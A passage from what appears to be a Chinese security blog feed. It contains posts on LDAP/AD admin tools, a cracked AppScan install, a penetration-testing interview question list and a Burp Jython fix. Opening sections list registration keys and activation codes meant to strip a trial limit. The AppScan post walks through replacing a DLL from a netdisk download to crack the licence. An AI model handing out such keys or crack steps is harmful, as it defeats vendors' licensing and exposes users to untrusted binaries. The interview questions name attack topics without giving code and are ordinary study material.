class="line">&quot;registrationKey&quot;:&quot;VW1wR2RGbFZUWGhqZWtaMFpWZDRNVmxYTVdoak1FSnVZbGRHY0dKRE5XcGlNakZFVFZSck5VOVVRVFJNZWtFMFRIcE5kMDFVYXowPQ==&quot;,</span><br><span class="line">&quot;activationCode&quot;:&quot;STARTTIMEGMT1565258022000-4718858022000&quot;</span><br></pre></td></tr></table></figure><h2 id="2-2-LDAP-Admin-Tool-Standard-Edition"><a href="#2-2-LDAP-Admin-Tool-Standard-Edition" class="headerlink" title="2.2 LDAP Admin Tool(Standard Edition)"></a>2.2 LDAP Admin Tool(Standard Edition)</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&quot;email&quot;:&quot;myluamas@gmail.com&quot;,</span><br><span class="line">&quot;registrationKey&quot;:&quot;VW1wR2RGbFZUWGhqZWtaMFpWZDRNVmxYTVdoak1FSnVZbGRHY0dKRE5XcGlNakZFVFZSck5VOVVRVFJNZWtFMFRIcE5kMDFVYXowPQ==&quot;,</span><br><span class="line">&quot;activationCode&quot;:&quot;STARTTIMEGMT1565258022000-4718858022000&quot;</span><br></pre></td></tr></table></figure><h2 id="2-3-AD-Admin-amp-Reporting-Tool"><a href="#2-3-AD-Admin-amp-Reporting-Tool" class="headerlink" title="2.3 AD Admin &amp; Reporting Tool"></a>2.3 AD Admin &amp; Reporting Tool</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&quot;email&quot;:&quot;myluamas@gmail.com&quot;,</span><br><span class="line">&quot;registrationKey&quot;:&quot;VVZWU1UxSnFSblJaVlUxNFkzcEdkR1ZYZURGWlZ6Rm9ZekJDYm1KWFJuQmlRelZxWWpJeFFsSkdTa1JOVkdzMVQxUkJORXg2UVRSTWVrMTNUVlJyUFE9PQ==&quot;,</span><br><span class="line">&quot;activationCode&quot;:&quot;STARTTIMEGMT1565258896000-4718858896000&quot;</span><br></pre></td></tr></table></figure><h2 id="2-4-LDAP-Plus-AD-HelpDesk-Professional-Tool"><a href="#2-4-LDAP-Plus-AD-HelpDesk-Professional-Tool" class="headerlink" title="2.4 LDAP Plus AD HelpDesk Professional Tool"></a>2.4 LDAP Plus AD HelpDesk Professional Tool</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&quot;email&quot;:&quot;myluamas@gmail.com&quot;,</span><br><span class="line">&quot;registrationKey&quot;:&quot;VW1wR2RFMTZVVEZXVjJ4dVlVZFNiV0ZIUm10YWJWSjBaVmQ0TVZsWE1XaGpNRUp1WWxkR2NHSkROV3BpTWpBeVRqQm9TV1JZYkd0VFIxWnpZMFJCTkV4NlFUUk1lazEzVFZSclBRPT0=&quot;,</span><br><span class="line">&quot;activationCode&quot;:&quot;STARTTIMEGMT1565259420000-4718859420000&quot;</span><br></pre></td></tr></table></figure><h2 id="2-5-LDAP-Admin-amp-Reporting-Tool"><a href="#2-5-LDAP-Admin-amp-Reporting-Tool" class="headerlink" title="2.5 LDAP Admin &amp; Reporting Tool"></a>2.5 LDAP Admin &amp; Reporting Tool</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&quot;email&quot;:&quot;myluamas@gmail.com&quot;,</span><br><span class="line">&quot;registrationKey&quot;:&quot;VkVWU1FsVkdTa2ROVnpGb1VYcEdlazFYTVRWaVNGWm9ZbGRHZWxGSFpIUlpWMnh6VEcxT2RtSlZlRVZSVmtKVFVYcEZOVTlVYTNkUFF6aDNUME00ZWsxRVJUVT0=&quot;</span><br><span class="line">,&quot;activationCode&quot;:&quot;STARTTIMEGMT1565259450000-4718859450000&quot;</span><br></pre></td></tr></table></figure><h2 id="2-6-AD-Admin-Tool"><a href="#2-6-AD-Admin-Tool" class="headerlink" title="2.6 AD Admin Tool"></a>2.6 AD Admin Tool</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&quot;email&quot;:&quot;myluamas@gmail.com&quot;,</span><br><span class="line"></span><br><span class="line">&quot;registrationKey&quot;:&quot;VVZWU1IwMVhNV2hSZWtaNlRWY3hOV0pJVm1oaVYwWjZVVWRrZEZsWGJITk1iVTUyWWxWR1JWRjZSVFZQVkd0M1QwTTRkMDlET0hwTlJFVTE=&quot;,</span><br><span class="line"></span><br><span class="line">&quot;activationCode&quot;:&quot;STARTTIMEGMT1565259487000-4718859487000&quot;</span><br></pre></td></tr></table></figure><h1 id="0x03-激活步骤"><a href="#0x03-激活步骤" class="headerlink" title="0x03 激活步骤"></a>0x03 激活步骤</h1><p>打开软件后找到工具栏上的<code>license</code></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190822105418.png" class="lozad"></p><p>然后填上对应版本的激活邮箱和key</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190822105504.png" class="lozad"></p><p>填好后点击next需要继续输入activationCode ，在我给的激活信息里面</p><p>激活完成以后重启软件会发现菜单栏上面的剩余时间29天没有了</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190822105527.png" class="lozad"></p><hr>]]></content>
      
      
      <categories>
          
          <category> 安全工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LADP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>AppScan 9.0.3.13 破解版本安装教程</title>
      <link href="/2019/08/21/AppScan-9-0-3-13-%E7%A0%B4%E8%A7%A3%E7%89%88%E6%9C%AC%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B/"/>
      <url>/2019/08/21/AppScan-9-0-3-13-%E7%A0%B4%E8%A7%A3%E7%89%88%E6%9C%AC%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>最近AppScan 9.0.3.13 版本发布，国内已经以后大佬破解成功了，下面来给大家讲讲如何安装和破解的。</p><a id="more"></a><h1 id="0x01-AppScan简介"><a href="#0x01-AppScan简介" class="headerlink" title="0x01 AppScan简介"></a>0x01 AppScan简介</h1><p>IBM AppScan是一款非常好用且功能强大的Web 应用安全测试工具，曾以 Watchfire AppScan的名称享誉业界，Rational AppScan 可自动化 Web 应用的安全漏洞评估工作，能扫描和检测所有常见的 Web 应用安全漏洞，例如 SQL<br>注入（SQL-injection）、跨站点脚本攻击（cross-site scripting）、缓冲区溢出（buffer overflow）及最新的 Flash/Flex 应用及 Web 2.0 应用曝露等方面安全漏洞的扫描。</p><h1 id="0x02-开始安装"><a href="#0x02-开始安装" class="headerlink" title="0x02 开始安装"></a>0x02 开始安装</h1><p>下载：<a href="https://pan.baidu.com/s/1uy2CPCkGRNVZ-vCvnpjJiA" target="_blank" rel="noopener">百度网盘传送门</a>  密码：zkyy</p><p>下载完成后解压出来 双击文件夹中的.exe文件</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191114162109.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191114162119.png" class="lozad"></p><p>出现下面这个原因是因为没有安装.net框架，而APPscan是需要这个框架环境的。所以软件会自动帮我们下载框架安装。</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191114162130.png" class="lozad"></p><p>框架下载中，耐性等待，可能时间会有点长。</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191114162141.png" class="lozad"></p><p>安装完框架以后会提示是否立即重启，点击立即重启就好</p><p>重启过后，再次进入安装界面</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191114162151.png" class="lozad"></p><p>一切默认即可</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191114162200.png" class="lozad"></p><p>耐心等待一会，等待安装完成</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191114162213.png" class="lozad"></p><h1 id="0x03-开始破解"><a href="#0x03-开始破解" class="headerlink" title="0x03 开始破解"></a>0x03 开始破解</h1><p>将下载的压缩包中的另个压缩包解压出来，复制里面的dll文件到APPscan的安装目录下</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191114162222.png" class="lozad"></p><p>进入APPscan的默认安装路径，如果是自己自定义的目录的话，找到就行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\ProgramFiles (x86)\IBM\AppScan Standard</span><br></pre></td></tr></table></figure><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191114162232.png" class="lozad"></p><p>然后打开APPscan,按照下面的操作导入证书</p><p><img alt="img" data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190821160727.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191114162256.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191114162317.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191114162329.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191114162340.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191114162350.png" class="lozad"></p><p>破解完成</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191114162400.png" class="lozad"></p><h1 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h1><p>安装破解基本操作。一顿默认配置，搞定。哈哈哈哈</p><p>新版老本对比了一下，创建扫描的界面修改了一下</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191114162410.png" class="lozad"></p><p>增加了云扫描</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191114162422.png" class="lozad"></p><p>其他的，大家自己与研究吧</p><p>附上官方教程视频</p><iframe width="900" height="506" src="https://www.youtube.com/embed/NiC7SJpwo80" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe><iframe width="900" height="506" src="https://www.youtube.com/embed/JFj0pDY9pm8" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe><hr>]]></content>
      
      
      <categories>
          
          <category> 神兵利器 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> APPscan </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>渗透测试面试宝典</title>
      <link href="/2019/08/20/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%9D%A2%E8%AF%95%E5%AE%9D%E5%85%B8/"/>
      <url>/2019/08/20/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%9D%A2%E8%AF%95%E5%AE%9D%E5%85%B8/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>随着科学技术的发展，网络安全已经提升到了国家层面。习大大说：“没有网络安全就没有国家安全。”那么在网络安全大热的今天，如何才能历经重重磨难才能达到公司需要的高度，才能符合面试官的口味,才能在众多才子中脱颖而出尼？那就好好看看博主这篇面试宝典吧，内容均是从网络上采集或者自己总结，有问题希望大家可以指出，一起进步！nice~</p><a id="more"></a><h1 id="0x01-简述漏洞挖掘的思路"><a href="#0x01-简述漏洞挖掘的思路" class="headerlink" title="0x01 简述漏洞挖掘的思路"></a>0x01 简述漏洞挖掘的思路</h1><h2 id="1-1-信息收集"><a href="#1-1-信息收集" class="headerlink" title="1. 1 信息收集"></a>1. 1 信息收集</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">服务器的相关信息（真实ip，系统类型，版本，开放端口，WAF等）</span><br><span class="line">网站指纹识别（包括，cms，cdn，证书等），dns记录</span><br><span class="line">whois信息，姓名，备案，邮箱，电话反查（邮箱丢社工库，社工准备等）</span><br><span class="line">子域名收集，旁站，C段等</span><br><span class="line">google hacking针对化搜索，pdf文件，中间件版本，弱口令扫描等</span><br><span class="line">扫描网站目录结构，爆后台，网站banner，测试文件，备份等敏感文件泄漏等</span><br><span class="line">传输协议，通用漏洞，exp，github源码等</span><br></pre></td></tr></table></figure><h2 id="1-2-漏洞挖掘"><a href="#1-2-漏洞挖掘" class="headerlink" title="1.2 漏洞挖掘"></a>1.2 漏洞挖掘</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">浏览网站，看看网站规模，功能，特点等</span><br><span class="line">端口，弱口令，目录等扫描,对响应的端口进行漏洞探测，比如 rsync,心脏出血，mysql,ftp,ssh弱口令等。</span><br><span class="line">XSS，SQL注入，上传，命令注入，CSRF，cookie安全检测，敏感信息，通信数据传输，暴力破解，任意文件上传，越权访问，未授权访问，目录遍历，文件 包含，重放攻击（短信轰炸），服务器漏洞检测，最后使用漏扫工具等</span><br></pre></td></tr></table></figure><h2 id="1-3-漏洞利用-amp-权限提升"><a href="#1-3-漏洞利用-amp-权限提升" class="headerlink" title="1.3 漏洞利用&amp;权限提升"></a>1.3 漏洞利用&amp;权限提升</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mysql提权，serv-u提权，oracle提权</span><br><span class="line">windows 溢出提权</span><br><span class="line">linux脏牛,内核漏洞提权</span><br></pre></td></tr></table></figure><h2 id="1-4-清除测试数据-amp-输出报告"><a href="#1-4-清除测试数据-amp-输出报告" class="headerlink" title="1.4 清除测试数据&amp;输出报告"></a>1.4 清除测试数据&amp;输出报告</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">日志、测试数据的清理</span><br><span class="line">总结，输出渗透测试报告，附修复方案</span><br></pre></td></tr></table></figure><h2 id="1-5-复测"><a href="#1-5-复测" class="headerlink" title="1.5 复测"></a>1.5 复测</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">验证并发现是否有新漏洞，输出报告，归档</span><br></pre></td></tr></table></figure><h1 id="0x02-面试题（一）"><a href="#0x02-面试题（一）" class="headerlink" title="0x02  面试题（一）"></a>0x02  面试题（一）</h1><h2 id="2-1-拿到一个待检测的站，你觉得应该先做什么？"><a href="#2-1-拿到一个待检测的站，你觉得应该先做什么？" class="headerlink" title="2.1 拿到一个待检测的站，你觉得应该先做什么？"></a>2.1 拿到一个待检测的站，你觉得应该先做什么？</h2><h3 id="2-1-1-信息收集"><a href="#2-1-1-信息收集" class="headerlink" title="2.1.1 信息收集"></a>2.1.1 信息收集</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1、获取域名的whois信息,获取注册者邮箱姓名电话等，丢社工库里看看有没有泄露密码，然后尝试用泄露的密码进行登录后台。用邮箱做关键词进行丢进搜索引擎。利用搜索到的关联信息找出其他邮箱进而得到常用社交账号。社工找出社交账号，里面或许会找出管理员设置密码的习惯 。利用已有信息生成专用字典。</span><br><span class="line">2、查询服务器旁站以及子域名站点，因为主站一般比较难，所以先看看旁站有没有通用性的cms或者其他漏洞。</span><br><span class="line">3、查看服务器操作系统版本，web中间件，看看是否存在已知的漏洞，比如IIS，APACHE,NGINX的解析漏洞</span><br><span class="line">4、查看IP，进行IP地址端口扫描，对响应的端口进行漏洞探测，比如 rsync,心脏出血，mysql,ftp,ssh弱口令等。</span><br><span class="line">5、扫描网站目录结构，看看是否可以遍历目录，或者敏感文件泄漏，比如php探针</span><br><span class="line">6、google hack 进一步探测网站的信息，后台，敏感文件</span><br></pre></td></tr></table></figure><p>如何扩大攻击面呢？<br>1.收集尽量全的企业域名（包括各种子域名以及子公司的域名，越全越好）<br>2.收集尽量全的企业申请的公网 IP<br>3.对所有收集到的域名以及 IP 地址进行端口扫描（由于时间可能比较久，所以可以<br>选择利用 zoomeye、shodan、censys 等平台）<br>4.针对不同的服务进行对应的渗透测试（尤其是可能存在漏洞的中间件）</p><h1 id="0x03-大佬面试经历"><a href="#0x03-大佬面试经历" class="headerlink" title="0x03 大佬面试经历"></a>0x03 大佬面试经历</h1><h2 id="3-1-360奇安信绿盟深信服等公司秋招面试题总结与分享"><a href="#3-1-360奇安信绿盟深信服等公司秋招面试题总结与分享" class="headerlink" title="3.1 360奇安信绿盟深信服等公司秋招面试题总结与分享"></a>3.1 360奇安信绿盟深信服等公司秋招面试题总结与分享</h2><h3 id="3-3-1-360"><a href="#3-3-1-360" class="headerlink" title="3.3.1 360"></a>3.3.1 360</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">讲讲渗透经验与成果</span><br><span class="line">给你一个站怎么验（讲到sql注入被打断）</span><br><span class="line">mysql和mssql是否了解（选了mysql）</span><br><span class="line">sql注入某参数（忘了）过滤应如何绕过</span><br><span class="line">sqlmap的tamper有没有自己写过</span><br><span class="line">sql注入写shell的前提、方法、指令</span><br><span class="line">过WAF的方法（要求详细说，用什么符号，怎么用）</span><br><span class="line">phpmyadmin提权思路</span><br><span class="line">挖过哪些逻辑漏洞</span><br><span class="line">给一个登录框，问验证漏洞的思路</span><br><span class="line">常用的信息收集方法</span><br><span class="line">怎么验证是否有CDN</span><br><span class="line">如何绕过CDN查真实IP</span><br><span class="line">同源策略原理是什么，如何绕过同源策略</span><br><span class="line">为什么同源策略无法防御csrf？</span><br><span class="line">B站与A站不同源的情况下如何从B站获取到A站用户信息</span><br><span class="line">ARP攻击原理，防御方法</span><br><span class="line">java与php的反序列原理，如何实现</span><br><span class="line">sqImap osshell原理?</span><br><span class="line">sqlmap udf原理?</span><br><span class="line">如何只用mysq|执行系统命令?</span><br><span class="line">黄金票据有了解吗?</span><br><span class="line">目标主机只开了139能否利用永恒之蓝?</span><br><span class="line">你入侵了一台非域成员主机，如何快速定位</span><br><span class="line">其他是域成员的主机?</span><br><span class="line">PHP的站限制了任何php文件上传，如何上个</span><br><span class="line">php文件? (排除截断 复写数字大小写)</span><br><span class="line">waf怎么绕?</span><br><span class="line">你拿到了server03的hash怎么利用?</span><br><span class="line">mimikatz抓密码的原理?</span><br><span class="line">不用mimikatz怎么抓明文密码?</span><br><span class="line">server12限制了抓取明文密码，怎么绕过?</span><br><span class="line">你有一-个webshell但无法执行系统命令，无上传，怎么进行内网渗透?</span><br><span class="line">你是域成员，如何拿到域控制器?</span><br><span class="line">你横向渗透常用手法有哪些?</span><br><span class="line">regorge有了解过吗、它的工作原理是什么?</span><br><span class="line">你发现了一个mysql的延时注入如何提高速</span><br><span class="line">xxe的原理是什么?背一下xxe。</span><br><span class="line">哪些会受同源策略的影响?</span><br><span class="line">最近的redisRCE有了解吗?它的原理是什么</span><br><span class="line">你拿到了redis未授权，你会怎么利用?</span><br><span class="line">你通过java站入侵了Windows，你Windows什么权限？</span><br><span class="line">你拿到了域控制器你会怎么样维持权限？</span><br></pre></td></tr></table></figure><p>360是最早给面试机会的，当时愣头青什么也没准备就去了，一面直接凉凉，流程是一站式面试，当天给结果。另附一份哥们的社招总结，面的好像是360政企</p><h3 id="3-3-2-奇安信"><a href="#3-3-2-奇安信" class="headerlink" title="3.3.2 奇安信"></a>3.3.2 奇安信</h3><p>基本跟360的套路差不多，owasp top10挑一些问漏洞原理和修复方法，渗透流程，提权，内网，结合一些网络（同源策略、CDN）以及编程（漏洞扫描器的编写，爬虫去重）的问题，另外比较关注src和漏洞挖掘成果。当时前面渗透测试的部分答的都算顺利，然后问到了简历上两个写上去为了装逼的项目，因为有夸大成分所以答得不甚理想，面试官应该觉得不诚实或者太水，GG</p><h3 id="3-3-3-绿盟"><a href="#3-3-3-绿盟" class="headerlink" title="3.3.3 绿盟"></a>3.3.3 绿盟</h3><p>到校宣讲后直接当场面试，前面有所重复的问题不重复记录，这里我的简历已经优化过几次，里面所有的东西都差不多心里有数。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">burp工具都有哪些用途，用到哪些模块</span><br><span class="line">在漏洞平台上提交过哪些洞，什么原理</span><br><span class="line">研究生期间的科研项目是否与安全相关，具体介绍一下</span><br><span class="line">详细讲讲你简历上的渗透项目，然后根据内容问了其中一些漏洞挖掘的细节。</span><br></pre></td></tr></table></figure><p>面试过程比较顺利，第二天就收到了副总面通知。</p><h3 id="3-3-4-深信服"><a href="#3-3-4-深信服" class="headerlink" title="3.3.4 深信服"></a>3.3.4 深信服</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">sql注入分类，宽字节注入原理。</span><br><span class="line">你的渗透经验。</span><br><span class="line">挖了哪些洞，怎么挖的。</span><br><span class="line">ctf打过哪些比赛，讲讲web中的上传题的类型和绕过方法</span><br><span class="line">如果让你用工具进行代码审计一个cms的上传功能，你会关注哪些函数</span><br><span class="line">php代码审计中命令执行你会关注哪些函数，代码执行你会关注哪些函数</span><br><span class="line">内网渗透怎么获取服务器账号密码</span><br><span class="line">内网渗透怎么维权</span><br><span class="line">python代码正则</span><br><span class="line">用python实现https请求中的一些坑</span><br></pre></td></tr></table></figure><p>感觉深信服问的又细又广，真的是问到怀疑人生，当时答完觉得不太理想，不过后来也给了终面通知。</p><h3 id="3-3-5-终面"><a href="#3-3-5-终面" class="headerlink" title="3.3.5 终面"></a>3.3.5 终面</h3><p>基本都是一些人事问题：</p><p>口才展示（自我介绍，项目介绍，讲讲你学生生涯最得意的两件事）<br>查户口（家哪的，父母干啥的，有没有女朋友\老婆，想在哪干）<br>性格测验（说出自己三个优点两个缺点，说出你最尊重的三个人，为什么）<br>压力测试（diss一下你的弱项，一个问题一直怼，考一考应变能力）<br>剩下的就是讨论一下薪资、进去之后的发展之类的。</p><h3 id="3-3-6-参考来源"><a href="#3-3-6-参考来源" class="headerlink" title="3.3.6 参考来源"></a>3.3.6 参考来源</h3><p>该文章出自tools上的一个文章，但没有找到具体的链接，如有侵权请联系删除。</p><h1 id="0x04-参考链接"><a href="#0x04-参考链接" class="headerlink" title="0x04 参考链接"></a>0x04 参考链接</h1><p><a href="https://mp.weixin.qq.com/s/OXo4sli37NmzzCrh4h6wYQ" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/OXo4sli37NmzzCrh4h6wYQ</a></p><p><a href="https://github.com/Mr-xn/BurpSuite-collections/blob/master/渗透测试面试问题2019版.md" target="_blank" rel="noopener">https://github.com/Mr-xn/BurpSuite-collections/blob/master/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%9D%A2%E8%AF%95%E9%97%AE%E9%A2%982019%E7%89%88.md</a></p><p><a href="https://github.com/Leezj9671/Pentest_Interview" target="_blank" rel="noopener">https://github.com/Leezj9671/Pentest_Interview</a></p><p><a href="https://www.shallowdream.cn/index.php/2018/07/06/50.html" target="_blank" rel="noopener">https://www.shallowdream.cn/index.php/2018/07/06/50.html</a></p><p>### </p><hr>]]></content>
      
      
      <categories>
          
          <category> 安全服务 </category>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
            <tag> 面试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web应用程序测试方法论</title>
      <link href="/2019/08/19/web%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%B5%8B%E8%AF%95%E6%96%B9%E6%B3%95%E8%AE%BA/"/>
      <url>/2019/08/19/web%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%B5%8B%E8%AF%95%E6%96%B9%E6%B3%95%E8%AE%BA/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>今天给大家分享一个web应用程序测试方法论的思维导图，希望大家可以通过思维导图理清自己测试的思路，查缺补漏，然后在总结出自己的方法论，欢迎大家和我交流。</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191115161522.png" class="lozad"></p><p>### </p><hr>]]></content>
      
      
      <categories>
          
          <category> 安全服务 </category>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 思维导图 </tag>
            
            <tag> 方法论 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>burp加载jython时出错</title>
      <link href="/2019/08/19/burp%E5%8A%A0%E8%BD%BDjython%E6%97%B6%E5%87%BA%E9%94%99/"/>
      <url>/2019/08/19/burp%E5%8A%A0%E8%BD%BDjython%E6%97%B6%E5%87%BA%E9%94%99/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>今天在安装burpsuite中的jpython环境时，出现了问题，这里记录一下，防止下次再次出现问题时不知所措。</p><a id="more"></a><h1 id="0x01-问题描述"><a href="#0x01-问题描述" class="headerlink" title="0x01 问题描述"></a>0x01 问题描述</h1><p>具体环境配置如下，路径都是正确的</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191114162452.png" class="lozad">勾选插件时出现下面的情况</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191114162505.png" class="lozad"></p><h1 id="0x02-问题原因"><a href="#0x02-问题原因" class="headerlink" title="0x02 问题原因"></a>0x02 问题原因</h1><p>jar包出现了问题，重新下载jar包完美解决问题</p><p>加载出错的jar包</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191114162517.png" class="lozad"></p><p>官网下载的jar包</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191114162527.png" class="lozad">    可以从文件的大小中就可以看出来，jar包有问题。</p><h1 id="0x03-解决步骤"><a href="#0x03-解决步骤" class="headerlink" title="0x03 解决步骤"></a>0x03 解决步骤</h1><p>第一步：去官网重新下载jython 的jar包文件</p><p> <a href="https://www.jython.org/downloads.html" target="_blank" rel="noopener">https://www.jython.org/downloads.html</a></p><p>第二步：将下载的jar包文件放到burp安装包路径下或者其他目录下也可以</p><p>注：必须示纯英文的路径，不能是中文路径，否则会出现错误。</p><p>第三步：重新导入jar包，路径需要正确，如下：</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191114162538.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191114162548.png" class="lozad"></p><blockquote><p>小技巧：输入法状态切换到英文输入模式下，然后按j，即可快速定位需要找到的文件。</p></blockquote><p>重新加载，成功了。</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191114162557.png" class="lozad"></p><h1 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h1><p>在遇到问题时，不要慌张，先去百度，google等搜索引擎搜索一下，看看是否有前人的解决方法，这样可以快速的解决问题，如果没有找到相关的解决方法，可以通过错误信息的提示，逐一排查，找到可能的错误点</p><p>### </p><hr>]]></content>
      
      
      <categories>
          
          <category> 神兵利器 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> burpsuite </tag>
            
            <tag> 解决问题 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>nessus数据库崩溃问题</title>
